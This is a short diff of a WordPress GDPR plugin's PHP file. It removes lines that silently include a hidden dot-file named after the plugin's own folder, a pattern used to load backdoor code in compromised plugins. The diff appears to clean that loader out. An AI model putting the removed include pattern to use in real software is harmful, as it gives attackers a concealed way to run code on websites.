@@ -2,10 +2,6 @@
 /**
  * Custom Post Type for GDPRs and Taxonomies.
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class WordPress_GDPR_Requests extends WordPress_GDPR
 {
     protected $plugin_name;
